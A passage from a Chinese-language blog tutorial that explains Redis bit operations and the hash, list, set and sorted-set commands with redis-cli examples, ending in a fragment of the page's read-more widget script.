命令的第二个和第三个参数，它们分别用来指定要查询的起始字节（从 0 开始算起）和结束字节。特别注意，这里第二个和第三个参数的单位不再是二进制位，而是字节。而返回的结果（位置）是从头开始算起的，与起始字节无关。如果不设置结束字节且键值的所有二进制位都是 1 的时候，则当要查询值为 0 的二进制位的位置时，返回结果会是键值长度的下一个字位的位置，这是因为 Redis 会认为键值长度之后的二进制位都是 0。举个例子，如果想查询第二个字节到第三个字节之间（即 “a” 和 “r”）出现的第一个值为 1 的二进制位的位置，则可以执行： 12345redis&gt; SET foo barOKredis&gt; BITPOS foo 1 1 2(integer) 9 位操作应用举例： 利用位操作命令可以非常紧凑地存储布尔值。比如假设网站的每个用户都有一个递增的整数 ID，如果使用一个字符串类型键配合位操作来记录每个用户的性别（用户 ID 作为索引，二进制位值 1 和 0 表示男性和女性），那么记录 100 万个用户的性别只需占用 100 KB 多的空间，而且由于 GETBIT 和 SETBIT 的时间复杂度都是 O (1)，所以读取二进制位值性能很高。 SETBIT 命令使用注意事项： 使用 SETBIT 命令时，如果当前键的键值长度小于要设置的二进制位的位置时，Redis 会自动分配内存并将键值的当前长度到指定的位置之间的二进制位都设置为 0。此时如果要分配的内存过大，则很可能会造成服务器的暂时阻塞而无法处理同一时间的其他请求。还是举刚才存储网站用户性别的例子，如果这个网站的用户 ID 是从 100000001 开始的，那么会造成 10 多 MB 的浪费，正确的做法是给每个用户的 ID 减去 100000000 再进行存储。 散列类型（Hash）Redis 是采用字典结构以键值对的形式存储数据的，而散列类型（Hash）的键值是一种字典结构，其存储了字段（Field）和字段值的映射，但字段值只能是字符串，不支持其他数据类型，即散列类型不能嵌套其他的数据类型。一个散列类型键可以包含之多 2^32 - 1 个字段。除了散列类型，Redis 的其他数据类型同样不支持数据类型嵌套。比如集合类型的每个元素都只能是字符串，不能是另一个集合或散列表等。散列类型适合存储对象：使用对象类别和 ID 构成键名，使用字段表示对象的属性，而字段值则存储属性值。例如要存储 ID 为 2 的汽车对象，可以分别使用名为 color、name 和 price 的 3 个字段来存储该辆汽车的颜色、名称和价格，具体存储结构图如下： 对比关系数据库中存储的汽车对象： 关系型数据库中，数据是以二维表的形式存储的，这就要求所有的记录都拥有相同的属性，无法单独为某条记录增减属性。如果想为 ID 为 1 的汽车增加生产日期的属性，就需要吧数据表更改为如上图所示的结构。增加一个属性后对于 ID 为 2 和 3 的两条记录而言 data 字段是冗余的。而 Redis 的散列类型则不存在这个问题，上图中描述了汽车对象的存储结构，但是这个结构只是人为的约定，Redis 并不强制要求每个键都依据此结构存储，完全可以自由地为任何键增减字段而不影响其他键。 赋值与取值（散列）赋值与取值命令： 123456789HSET key field valueHGET key fieldHMSET key field value [field value ...]HMGET key field [field ...]HGETALL key 示例： 12345678redis&gt; HSET car price 500(integer) 1redis&gt; HSET car name BMW(integer) 1redis&gt; HGET car name"BMW" HSET 命令的方便之处在于不区分新增和更新操作，这意味着修改数据时不用事先判断字段是否存在来决定要执行的是新增操作（inert）还是更新操作（update）。当执行的是新增操作时（即之前字段不存在）HSET 命令会返回 1，当执行的是更新操作时（即之前字段已经存在）HSET 命令会返回 0。更进一步，当键本身不存在时，HSET 命令还会自动创建它。值得注意的是，Redis 中每个键都属于一个明确的数据类型，如通过 HSET 命令建立的键是散列类型，通过 SET 命令建立的键是字符串类型等等。使用一种数据类型的命令操作另一种数据类型的键会提示错误：”ERR Operation against a key holding the wrong kind of value”；但并不是所有命令都如此，比如 SET 命令可以覆盖已经存在的键而不管原来的键是什么类型。 若需要同时设置、获取多个字段的值时，可以使用 HMSET、HMGET 命令： 123456redis&gt; HMSET car2 price 500 name BMWOKredis&gt; HMGET car2 price name1) "500"2) "BMW" 若想获取键中所有字段和字段值却不知道键中有哪些字段，则应该使用 HGETALL 命令： 12345redis&gt; HGETALL car1) "price"2) "500"3) "name"4) "BMW" 判断字段是否存在HEXISTS 命令用来判断一个字段是否存在，如果存在则返回 1，否则返回 0（如果键不存在也会返回 0）。 1HEXISTS key field 示例： 12345678redis&gt; HEXISTS car model(integer) 0redis&gt; HSET car model c200(integer) 1redis&gt; HEXISTS car model(integer) 1 当字段不存在时赋值HSETNX 命令与 HSET 命令类似，区别在于如果字段已经存在，HSETNX 命令将不执行任何操作。HSETNX 命令中的 “NX” 表示 “If Not Exists”（如果不存在），同时 HSETNX 命令是原子操作，不用担心竞态条件，可以用作分布式锁的实现。 1HSETNX key field value 示例： 12345678redis&gt; HSET car model c200(integer) 1redis&gt; HSETNX car model c300(integer) 0redis&gt; HGET car model"c200" 增加字段HINCRBY 与 INCR、INCRBY 命令类似，可以使字段值增加指定的整数。散列类型没有 HINCR 命令，但可以通过 HINCRBY key field 1 来实现。 1HINCRBY key field increment 示例： 12345redis&gt; HINCRBY person score 60(integer) 60redis&gt; HGET person score"60" 当 persion 键不存在时，HINCRBY 命令会自动建立该键，并设置字段 score 的默认值为 0，然后再执行自增操作，命令的返回结果是增值后的字段值。 删除字段HDEL 命令可以删除一个或多个字段，返回值是被删除的字段个数。 1HDEL key field [field ...] 示例： 12345redis&gt; HDEL car name(integer) 1redis&gt; HDEL car name(integer) 0 只获取字段名或字段值若仅仅需要获取键中所有字段的名称或者字段值，那么可以使用 HKEYS、HVALS 命令： 123HKEYS keyHVALS key 示例： 1234567redis&gt; HKEYS car1) "price"2) "model"redis&gt; HVALS car1) "500"2) "c200" 列表类型（List）列表类型（List）可以存储一个有序的字符串列表，常用的操作是向列表两端添加元素，或者获得列表的某一个片段。列表类型内部是使用双向链表（double linked list）实现的，所以向列表两端添加元素的时间复杂度为 O (1)，获取越接近两端的元素速度就越快。这意味着即使是一个有几千万个元素的列表，获取头部或尾部的 10 条记录也是极快的（和从只有 20 个元素的列表中获取头部或尾部的 10 条记录的速度是一样的），不过使用链表的代价是通过索引访问元素比较慢，其元素遍历速度要远慢于数组。这种特性使列表类型能非常快速地完成关系数据库难以应付的场景：如社交网站的新鲜事，用户关心的只是最新的内容，使用列表类型存储，即使新鲜事的总数达到几千万个，获取其中最新的 100 条数据也是极快的。同样因为在两端插入记录的时间复杂度是 O (1)，列表类型也适合用来记录日志，可以保证加入新日志的速度不会受到已有日志数量的影响。与散列类型键最多能容纳的字段数量相同，一个列表类型键最多能容纳 2^32 − 1 个元素。借助列表类型，Redis 还可以作为队列使用。 向列表两端添加元素LPUSH 命令用来向列表左边添加元素，返回值表示添加元素后列表的总长度。 123LPUSH key value [value …]RPUSH key value [value …] 示例： 12345redis&gt; LPUSH numbers 1(integer) 1redis&gt; LPUSH numbers 2 3(integer) 3 当通过 LPUSH 命令往列表中依次添加 “1”、”2“、”3“ 时，numbers 键中的数据如下图所示： 使用 RPUSH 命令向列表右边添加元素的话，其用法和 LPUSH 命令一样： 12redis&gt; RPUSH numbers 0 -1(integer) 3 此时 numbers 键中的数据如下图所示： 从列表两端弹出元素有进有出，LPOP 命令可以从列表左边弹出一个元素。LPOP 命令执行两步操作：第一步是将列表左边的元素从列表中移除，第二步是返回被移除的元素值。 123LPOP keyRPOP key 示例： 12345redis&gt; LPOP numbers"3"redis&gt; RPOP numbers"-1" 从 numbers 列表左边弹出一个元素（也就是 ”3“），同时列表右边也弹出一个元素（即”-1“），此时 numbers 键中的数据如下图所示： 综合 LPUSH、RPUSH、LPOP、RPOP 命令，可以使用列表类型来模拟栈和队列的操作。如果想把列表当做栈，则搭配使用 LPUSH、LPOP 或 RPUSH、RPOP。如果想当成队列，则搭配使用 LPUSH、RPOP 或 RPUSH、LPOP。 获取列表中元素的个数当键不存在时，LLEN 命令会返回 0。 1LLEN key 示例： 12redis&gt; LLEN numbers(integer) 3 LLEN 命令的功能类似 SQL 语句 SELECT COUNT(*) FROM table_name，但是 LLEN 的时间复杂度为 O (1)，使用时 Redis 会直接读取现成的值，而不需要像部分关系数据库（如使用 InnoDB 存储引擎的 MySQL 表）那样需要遍历一遍数据表来统计条目数量。 获得列表片段LRANGE 命令是列表类型最常用的命令之一，它能够获得列表中的某一片段。LRANGE 命令将返回索引从 start 到 stop 之间的所有元素（包含两端的元素：start、stop），Redis 的列表起始索引为 0。LRANGE 命令在取得列表片段时，不会像 LPOP 一样删除该片段。 1LRANGE key start stop 示例： 1234redis&gt; LRANGE numbers 0 21) "2"2) "1"3) "0" LRANGE 命令也支持负索引，表示从右边开始计算序数，如 “-1” 表示最右边第一个元素，”-2” 表示最右边第二个元素，依次类推。显然，LRANGE numbers 0 -1 可以获取列表中的所有元素。 12345678redis&gt; LRANGE numbers 0 -11) "2"2) "1"3) "0"redis&gt; LRANGE numbers -2 -11) "1"2) "0" 虽然 LRANGE numbers 0 -1 可以获取列表中的所有元素，但存在一些特殊情况如下： 如果 start 的索引位置比 stop 的索引位置靠后，则会返回空列表 如果 stop 大于实际的索引范围，则会返回到列表最右边的元素 删除列表中指定的值1LREM key count value LREM 命令会删除列表中前 count 个值为 value 的元素，返回值是实际删除的元素个数。根据 count 值的不同，LREM 命令的执行方式会略有差异，具体如下： 当 count &gt; 0 时 LREM 命令会从列表左边开始删除前 count 个值为 value 的元素。 当 count &lt; 0 时 LREM 命令会从列表右边开始删除前 |count| 个值为 value 的元素。 当 count = 0 是 LREM 命令会删除所有值为 value 的元素。 示例： 1234567891011121314redis&gt; LRANGE numbers 0 -11) "2"2) "1"3) "0"4) "2"# 从右边开始删除第一个值为”2“的元素redis&gt; LREM numbers -1 2(integer) 1redis&gt; LRANGE numbers 0 -11) "2"2) "1"3) "0" 获取与设置指定索引的元素值如果要将列表类型当作数组来用，LINDEX 命令是必不可少的。LINDEX 命令用来返回指定索引的元素，索引从 0 开始。 123LINDEX key indexLSET key index value 示例： 12345678redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LINDEX numbers 1"3" LSET 是另一个通过索引操作列表的命令，它会将索引为 index 的元素赋值为 value。 1234567891011redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LSET numbers 1 10OKredis&gt; LINDEX numbers 1"10" 只保留列表指定片段LTRIM 命令可以删除指定索引范围之外的所有元素，其指定列表范围的方法和 LRANGE 命令相同，即保留索引从 start 到 stop 之间的所有元素（包含两端的元素：start、stop）。 1LTRIM key start stop 示例： 123456789101112redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LTRIM numbers 1 2OKredis&gt; LRANGE numbers 0 -11) "3"2) "2" LTRIM 命令常和 LPUSH 命令一起使用来限制列表中元素的数量，比如记录日志时希望只保留最近的 100 条日志，则每次加入新元素时调用一次 LTRIM 命令即可： 123LPUSH logs $newLogLTRIM logs 0 99 向列表中插入元素LINSERT 命令首先会在列表中从左到右查找值为 pivot 的元素，然后根据第二个参数是 BEFORE 还是 AFTER 来决定将 value 插入到该元素的前面还是后面，命令的返回值是插入后列表的元素个数。 1LINSERT key BEFORE|AFTER pivot value 示例： 123456789101112131415redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"redis&gt; LINSERT numbers after 1 0(integer) 5redis&gt; LRANGE numbers 0 -11) "4"2) "3"3) "2"4) "1"5) "0" 将元素从一个列表转到另一个列表RPOPLPUSH 是个很有意思的命令，从名字就可以看出它的功能：先执行 RPOP 命令再执行 LPUSH 命令。RPOPLPUSH 命令会先从 source 列表类型键的右边弹出一个元素，然后将其加入到 destination 列表类型键的左边，并返回这个元素的值，整个过程是原子的。 1RPOPLPUSH source destination 当把列表类型作为队列使用时，RPOPLPUSH 命令可以很直观地在多个队列中传递数据。当 source 和 destination 相同时，RPOPLPUSH 命令会不断地将队尾的元素移到队首，借助这个特性可以实现一个网站监控系统：使用一个队列存储需要监控的网址，然后监控程序不断地使用 RPOPLPUSH 命令循环取出一个网址来测试可用性。这里使用 RPOPLPUSH 命令的好处在于在程序执行过程中仍然可以不断地向网址列表中加入新网址，而且整个系统容易扩展，允许多个客户端同时处理队列。 列表阻塞操作BLPOP 命令是 LPOP 命令的阻塞版本，当给定列表内没有任何元素可供弹出的时候，Redis 连接将被 BLPOP 命令阻塞，直到等待超时或发现可弹出元素为止。超时参数 timeout 接受一个以秒为单位的数字作为值，设为 0 表示阻塞时间可以无限期延迟。当给定多个 Key 参数时，BLPOP 命令会按参数 Key 的先后顺序依次检查各个列表，弹出第一个非空列表的头元素，并和被弹出元素所属的列表的名字一起，组成结果返回给调用者。如果所有给定 Key 都不存在或包含空列表，那么 BLPOP 命令将阻塞连接直到等待超时，或者有另一个客户端对给定 Key 的任意一个执行 LPUSH 或 RPUSH 命令为止。BRPOP、BRPOPLPUSH 命令与 BLPOP 命令类似，这里不再累述。 12345BLPOP key [key ...] timeoutBRPOP key [key ...] timeoutBRPOPLPUSH source destination timeout 示例：假设现在有 job 、 command 和 request 三个列表，其中 job 不存在， command 和 request 都持有非空列表。 123456789redis&gt; LPUSH command "update system"(integer) 1redis&gt; LPUSH request "visit page"(integer) 1redis&gt; BLPOP job command request 01) "command"2) "update system..." 上面的例子中，BLPOP 命令返回的元素来自 command 列表，因为它是按” 查找 job -&gt; 查找 command -&gt; 查找 request “这样的顺序，找到第一个非空列表 command。 集合类型（Set）在集合中的每个元素都是不同的，且没有顺序。一个集合类型键可以存储至多 2^32 - 1 个字符串。集合类型与散列类型的对比如下： 比较内容 集合类型 列表类型 存储内容 至多 2^32 - 1 个字符串 至多 2^32 - 1 个字符串 有序性 否 是 唯一性 是 否 集合类型的常用操作是向集合中加入或删除元素、判断某个元素是否存在等。由于集合类型在 Redis 内部是使用值为空的散列表（Hash Table）实现的，所以这些操作的时间复杂度都是 O (1)。最方便的是多个集合类型键之间还可以进行并集、交集和差集运算。 增加、删除元素SADD 命令用来向集合中增加一个或多个元素，如果键不存在则会自动创建。因为在一个集合中不能有相同的元素，所以如果要加入的元素已经存在于集合中就会忽略这个元素。该命令的返回值是成功加入的元素数量（忽略的元素不计算在内）。 1SADD key member [member …] 示例： 12345redis&gt; SADD letters a(integer) 1redis&gt; SADD letters a b c(integer) 2 SREM 命令用来从集合中删除一个或多个元素，并返回删除成功的个数。 1SREM key member [member …] 示例： 12redis&gt; SREM letters b c(integer) 2 获取集合中的所有元素SMEMBERS 命令会返回集合中的所有元素。 1SMEMBERS key 示例： 123redis&gt; SMEMBERS letters1) "a"2) "b" 判断元素是否在集合中判断一个元素是否在集合中是一个时间复杂度为 O (1) 的操作，无论集合中有多少个元素，SISMEMBER 命令始终可以极快地返回结果。当值存在时 SISMEMBER 命令返回 1，当值不存在或键不存在时返回 0。 1SISMEMBER key member 示例： 12redis&gt; SISMEMBER letters a(integer) 1 集合间运算集合间运算命令（差集、交集、并集）： 12345SDIFF key [key ...]SINTER key [key ...]SUNION key [key ...] SDIFF 命令用来对多个集合执行差集运算。集合 A 与集合 B 的差集表示为 A−B，代表所有属于 A 且不属于 B 的元素构成的集合。 1234567891011redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SDIFF setA setB1) "1"redis&gt; SDIFF setB setA1) "4" SDIFF 命令自持同时传入多个键，下面的例子中，计算顺序是先计算 setA 与 setB 的差集，再计算结果与 setC 的差集。 1234567891011redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SADD setC 2 3(integer) 2redis&gt; SDIFF setA setB setC1) "1" SINTER 命令用来对多个集合执行交集运算。集合 A 与集合 B 的交集表示为 A ∩ B，代表所有属于 A 且属于 B 的元素构成的集合。SINTER 同样支持同时传入多个键。 123456789redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SINTER setA setB1) "2"2) "3" SUNION 命令用来对多个集合执行并集运算。集合 A 与集合 B 的并集表示为 A ∪ B，代表所有属于 A 或者属于 B 的元素构成的集合。SUNION 同样支持同时传入多个键。 1234567891011redis&gt; SADD setA 1 2 3(integer) 3redis&gt; SADD setB 2 3 4(integer) 3redis&gt; SUNION setA setB1) "1"2) "2"3) "3"4) "4" 获取集合中元素的个数SCARD 命令用来获得集合中的元素个数。 1SCARD key 示例： 12345678redis&gt; SMEMBERS setA1) "b"2) "d"3) "a"4) "c"redis&gt; SCARD setA(integer) 4 进行集合运算并将结果存储12345SDIFFSTORE destination key [key …]SINTERSTORE destination key [key …]SUNIONSTORE destination key [key …] SDIFFSTORE 命令和 SDIFF 命令功能一样，唯一的区别就是前者不会直接返回运算结果，而是将结果存储在 destination 键中。 SDIFFSTORE 命令常用于需要进行多步集合运算的场景中，如需要先计算差集再将结果和其他键计算交集。 SINTERSTORE 、 SUNIONSTORE 命令与 SDIFFSTORE 类似，不再赘述。 随机获得集合中的元素SRANDMEMBER 命令用来随机从集合中获取一个元素，还可以传递 count 参数来一次随机获得多个元素。根据 count 的正负不同，SRANDMEMBER 命令的具体表现也不同： 当 count 为正数时，SRANDMEMBER 会随机从集合里获得 count 个不重复的元素。如果 count 的值大于集合中的元素个数，则 SRANDMEMBER 会返回集合中的全部元素。 当 count 为负数时，SRANDMEMBER 会随机从集合里获得 |count| 个的元素，这些元素有可能相同。 SRANDMEMBER 命令返回的结果并不是非常随机的，根本原因是由集合类型的存储结构（Hash Table）决定的，点击查看详细解释 1SRANDMEMBER key [count] 示例： 123456789101112131415161718192021redis&gt; SMEMBERS setA1) "b"2) "d"3) "a"4) "c"redis&gt; SRANDMEMBER setA"b"redis&gt; SRANDMEMBER setA 11) "c"redis&gt; SRANDMEMBER setA -21) "c"2) "c"redis&gt; SRANDMEMBER setA 51) "b"2) "a"3) "d"4) "c" 从集合中弹出一个元素由于集合类型的元素是无序的，所以 SPOP 命令会从集合中随机选择一个元素弹出。 1SPOP key 示例： 12345678redis&gt; SMEMBERS setA1) "b"2) "d"3) "a"4) "c"redis&gt; SPOP setA"c" 有序集合类型（Sorted Set）在集合类型的基础上有序集合类型为集合中的每个元素都关联了一个分数，这使得不仅可以完成插入、删除和判断元素是否存在等集合类型支持的操作，还能够获得分数最高（或最低）的前 N 个元素、获得指定分数范围内的元素等与分数有关的操作。虽然集合中每个元素都是不同的，但是它们的分数却可以相同。 有序集合类型和列表类型的相同点： 都是有序的 都可以获得某一范围的元素 有序集合类型和列表类型的不同点： 列表类型是通过双向链表实现的，获取靠近两端的数据速度极快，而当元素增多后，访问中间数据的速度会较慢，所以它更加适合实现如 “新鲜事” 或 “日志” 这样很少访问中间元素的应用 有序集合类型是使用散列表（Hash Table）和跳跃表（Skip List）实现的，所以即使读取位于中间部分的数据速度也很快，时间复杂度是 O (log (N)) 列表中不能简单地调整某个元素的位置，但是有序集合可以（通过更改这个元素的分数） 有序集合要比列表类型更耗费内存 增加元素ZADD 命令用来向有序集合中加入一个元素和该元素的分数，如果该元素已经存在则会用新的分数替换原有的分数。ZADD 命令的返回值是新加入到集合中的元素个数（不包含之前已经存在的元素）。 1ZADD key score member [score member …] 示例： 12345redis&gt; ZADD scoreboard 89 Tom 67 Peter 100 Jim(integer) 3redis&gt; ZADD scoreboard 80 Peter(integer) 0 分数不仅可以是整数，还支持双精度浮点数，其中 +inf 和 -inf 分别表示正无穷和负无穷。 1234567891011redis&gt; ZADD testboard 17E+307 a(integer) 1redis&gt; ZADD testboard 1.5 b(integer) 1redis&gt; ZADD testboard `+inf`c(integer) 1redis&gt; ZADD testboard `-inf` d(integer) 1 获取元素的分数1ZSCORE key member 示例： 12redis&gt; ZSCORE scoreboard Tom"89" 获得排名在某个范围的元素列表ZRANGE 命令会按照元素分数从小到大的顺序返回索引从 start 到 stop 之间的所有元素（包含两端的元素：start、stop）。ZRANGE 命令与 LRANGE 命令十分类似，如索引都是从 0 开始，负数代表从后向前查找（−1 表示最后一个元素）。 123ZRANGE key start stop [WITHSCORES]ZREVRANGE key start stop [WITHSCORES] 示例： 1234567891011redis&gt; ZADD scoreboard 89 Tom 67 Peter 100 Jim(integer) 3redis&gt; ZRANGE scoreboard 0 21) "Peter"2) "Tom"3) "Jim"redis&gt; ZRANGE scoreboard 1 -11) "Tom"2) "Jim" 如果需要同时获得元素的分数的话，可以在 ZRANGE 命令的尾部加上 WITHSCORES 参数： 1234567redis&gt; ZRANGE scoreboard 0 -1 WITHSCORES1) "Peter"2) "67"3) "Tom"4) "89"5) "Jim"6) "100" ZRANGE 命令的时间复杂度为 O (log n+m)，其中 n 为有序集合的基数，m 为返回的元素个数。如果两个元素的分数相同，Redis 会按照字典顺序（即 0 &lt; 9 &lt; A &lt; Z &lt; a &lt; z 的顺序）来进行排列。如果元素的值是中文，那么排列顺序取决于中文的编码方式，例如使用 UTF-8 编码时排列顺序如下，可见此时 Redis 依然是按照字典顺序排列这些元素。 12345678redis&gt; ZADD chineseName 0 马华 0 刘墉 0 司马光 0 赵哲(integer) 4redis&gt; ZRANGE chineseName 0 -11) "\\xe5\\x88\\x98\\xe5\\xa2\\x89"2) "\\xe5\\x8f\\xb8\\xe9\\xa9\\xac\\xe5\\x85\\x89"3) "\\xe8\\xb5\\xb5\\xe5\\x93\\xb2"4) "\\xe9\\xa9\\xac\\xe5\\x8d\\x8e" ZREVRANGE 命令与 ZRANGE 命令的唯一不同在于 ZREVRANGE 命令是按照元素的分数从大到小的顺序输出结果。 1234567redis&gt; ZREVRANGE scoreboard 0 -1 WITHSCORES1) "Jim"2) "100"3) "Tom"4) "89"5) "Peter"6) "67" 获得指定分数范围的元素ZRANGEBYSCORE 命令参数虽然多，但是都很好理解。该命令按照元素分数从小到大的顺序返回分数在 min 和 max 之间（包含 min 和 max ）的元素。值得注意的是，ZREVRANGEBYSCORE 命令不仅是按照元素分数从大往小的顺序输出结果，而且它的 min 和 max 参数的位置与 ZRANGEBYSCORE 命令是相反的。 123ZRANGEBYSCORE key min max [WITHSCORES] [LIMIT offset count]ZREVRANGEBYSCORE key max min [WITHSCORES] [LIMIT offset count] 示例： 123456redis&gt; ZADD scoreboard 89 Tom 67 Peter 100 Jim(integer) 3redis&gt; ZRANGEBYSCORE scoreboard 80 1001) "Tom"2) "Jim" 如果希望分数范围不包含端点值，可以在分数前加上 “(” 符号。例如，希望返回 80 分到 100 分的数据，可以含 80 分，但不包含 100 分，则命令如下： 12redis&gt; ZRANGEBYSCORE scoreboard 80 (1001) "Tom" min 和 max 还支持无穷值，这和 ZADD 命令一样，其中 +inf 和 -inf 分别表示正无穷和负无穷。比如希望得到分数高于 80 分（不包含 80 分）的人的名单，但却不知道最高分是多少，这时候就可以用上 +inf： 123redis&gt; ZRANGEBYSCORE scoreboard (80 +inf1) "Tom"2) "Jim" LIMIT offset count 与 SQL 中的用法基本相同，即在获得的元素列表的基础上向后偏移 offset 个元素，并且只获取 count 个元素。例如下面的例子中，表示获得分数高于 60 分的，并从第二个人开始的 3 个人： 123456789101112131415161718redis&gt; ZRANGE scoreboard 0 -1 WITHSCORES 1) "Jerry" 2) "56" 3) "Peter" 4) "67" 5) "Yvonne" 6) "67" 7) "Tom" 8) "89" 9) "Wendy"10) "92"11) "Jim"12) "100"redis&gt; ZRANGEBYSCORE scoreboard 60 +inf LIMIT 1 31) "Yvonne"2) "Tom"3) "Wendy" 如果想获取分数低于或等于 100 分的前 3 个人，可以借助 ZREVRANGEBYSCORE 命令实现。ZREVRANGEBYSCORE 命令不仅是按照元素分数从大往小的顺序输出结果，而且它的 min 和 max 参数的位置与 ZRANGEBYSCORE 命令是相反的。 123456789101112131415161718redis&gt; ZREVRANGE scoreboard 0 -1 WITHSCORES 1) "Jim" 2) "100" 3) "Wendy" 4) "92" 5) "Tom" 6) "89" 7) "Yvonne" 8) "67" 9) "Peter"10) "67"11) "Jerry"12) "56"redis&gt; ZREVRANGEBYSCORE scoreboard 100 0 LIMIT 0 31) "Jim"2) "Wendy"3) "Tom" 增减某个元素的分数ZINCRBY 命令可以增加一个元素的分数，返回值是更改后的分数。 1ZINCRBY key increment member 示例： 12345678redis&gt; ZSCORE scoreboard Peter"67"redis&gt; ZINCRBY scoreboard 6 Peter"73"redis&gt; ZSCORE scoreboard Peter"73" increment 也可以是个负数表示减分，例如给 Peter 减 4 分： 12redis&gt; ZINCRBY scoreboard -4 Peter"69" 如果指定的元素不存在，Redis 在执行命令前会先建立它并将它的分数值赋为 0，然后再执行增减操作。 获取集合中元素的数量1ZCARD key 示例： 12redis&gt; ZCARD scoreboard(integer) 6 获得指定分数范围内的元素个数ZCOUNT 命令的 min 和 max 参数的特性与 ZRANGEBYSCORE 命令中的一样。 1ZCOUNT key min max 示例： 12345678910111213141516171819redis&gt; ZRANGE scoreboard 0 -1 WITHSCORES 1) "Jerry" 2) "56" 3) "Yvonne" 4) "67" 5) "Peter" 6) "69" 7) "Tom" 8) "89" 9) "Wendy"10) "92"11) "Jim"12) "100"redis&gt; ZCOUNT scoreboard 90 100(integer) 2redis&gt; ZCOUNT scoreboard (80 +inf(integer) 3 删除一个或多个元素ZREM 命令的返回值是成功删除的元素数量（不包含本来就不存在的元素）。 1ZREM key member [member …] 示例： 12345redis&gt; ZREM scoreboard Wendy(integer) 1redis&gt; ZCARD scoreboard(integer) 5 按照排名范围删除元素ZREMRANGEBYRANK 命令按照元素分数从小到大的顺序（即索引 0 表示最小的值）删除处在指定排名范围内的所有元素，并返回删除的元素数量。 1ZREMRANGEBYRANK key start stop 示例： 12345678910redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 6redis&gt; ZREMRANGEBYRANK testRem 0 2(integer) 3redis&gt; ZRANGE testRem 0 -11) "d"2) "e"3) "f" 按照分数范围删除元素ZREMRANGEBYSCORE 命令会删除指定分数范围内的所有元素，参数 min 和 max 的特性和 ZRANGEBYSCORE 命令中的一样，返回值是删除的元素数量。 1ZREMRANGEBYSCORE key min max 示例： 123456789101112redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 6redis&gt; ZREMRANGEBYSCORE testRem (4 5(integer) 1redis&gt; ZRANGE testRem 0 -11) "a"2) "b"3) "c"4) "d"5) "f" 获得元素的排名123ZRANK key memberZREVRANK key member ZRANK 命令会按照元素分数从小到大的顺序获得指定的元素的排名（从 0 开始，即分数最小的元素排名为 0）。 12345redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 1redis&gt; ZRANK testRem b(integer) 1 ZREVRANK 命令则与 ZRANK 命令相反，分数最大的元素排名为 0。 12345redis&gt; ZADD testRem 1 a 2 b 3 c 4 d 5 e 6 f(integer) 6redis&gt; ZREVRANK testRem f(integer) 0 计算有序集合的交集ZINTERSTORE 命令用来计算多个有序集合的交集并将结果存储在 destination 键中（同样以有序集合类型存储），返回值为 destination 键中的元素个数，若 destination 键已存在则会被覆盖。其中 destination 键中元素的分数是由 AGGREGATE 参数决定的。 1ZINTERSTORE destination numkeys key [key …] [WEIGHTS weight [weight…]] [AGGREGATE SUM|MIN|MAX] 当 AGGREGATE 是 SUM 时（也就是默认值），destination 键中元素的分数是每个参与计算的集合中该元素分数的和。 1234567891011121314redis&gt; ZADD sortedSets1 1 a 2 b(integer) 2redis&gt; ZADD sortedSets2 10 a 20 b(integer) 2redis&gt; ZINTERSTORE sortedSetsResult 2 sortedSets1 sortedSets2(integer) 2redis&gt; ZRANGE sortedSetsResult 0 -1 WITHSCORES1) "a"2) "11"3) "b"4) "22" 当 AGGREGATE 是 MIN 时，destination 键中元素的分数是每个参与计算的集合中该元素分数的最小值。 1234567891011121314redis&gt; ZADD sortedSets1 1 a 2 b(integer) 2redis&gt; ZADD sortedSets2 10 a 20 b(integer) 2redis&gt; ZINTERSTORE sortedSetsResult 2 sortedSets1 sortedSets2 AGGREGATE MIN(integer) 2redis&gt; ZRANGE sortedSetsResult 0 -1 WITHSCORES1) "a"2) "1"3) "b"4) "2" 当 AGGREGATE 是 MAX 时，destination 键中元素的分数是每个参与计算的集合中该元素分数的最大值。 1234567891011121314redis&gt; ZADD sortedSets1 1 a 2 b(integer) 2redis&gt; ZADD sortedSets2 10 a 20 b(integer) 2redis&gt; ZINTERSTORE sortedSetsResult 2 sortedSets1 sortedSets2 AGGREGATE MAX(integer) 2redis&gt; ZRANGE sortedSetsResult 0 -1 WITHSCORES1) "a"2) "10"3) "b"4) "20" 计算有序集合的并集ZUNIONSTORE 命令用于计算集合间的并集，与 ZINTERSTORE 命令的使用方法一样，这里不再累述。 1ZUNIONSTORE destination numkeys key [key …] [WEIGHTS weight [weight…]] [AGGREGATE SUM|MIN|MAX] 数据类型使用总结 数据类型 结构存储的值 结构的读写能力 博客系统中的应用 字符串类型 可以是字符串、整数或者浮点数 对整个字符串或字符串的其中一部分执行操作；对整数和浮点数执行自增或者自减操作 （1） 博客文章访问量统计（2）生成自增 ID 散列类型 包含键值对的无序散列表 添加、获取、移除单个键值对；获取所有键值对 （1）存储文章数据（2）存储文章缩略名 列表类型 一个双向链表，链表上的每个节点都包含了一个字符串 从链表的两端推入或者弹出元素；根据偏移量对链表进行修剪（Trim）；读取单个或多个元素；根据值查找或者移除元素 （1）存储文章 ID 列表（2）存储评论列表 集合类型 包含字符串的无序收集器，并且被包含的每个字符串都不可重复 添加、获取、移除单个元素；检查一个元素是否存在于集合中；计算交集、并集、差集；从集合里面随机获取元素 （1）存储文章标签（2）通过标签搜索文章 有序集合类型 字符串成员与浮点数分值之间的有序映射，元素的排列顺序由分值的大小决定 添加、获取、删除单个元素；根据分值范围或者成员来获取元素 （1）实现按点击量排序（2）更改文章发布时间和获得指定时间范围内的文章列表 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": 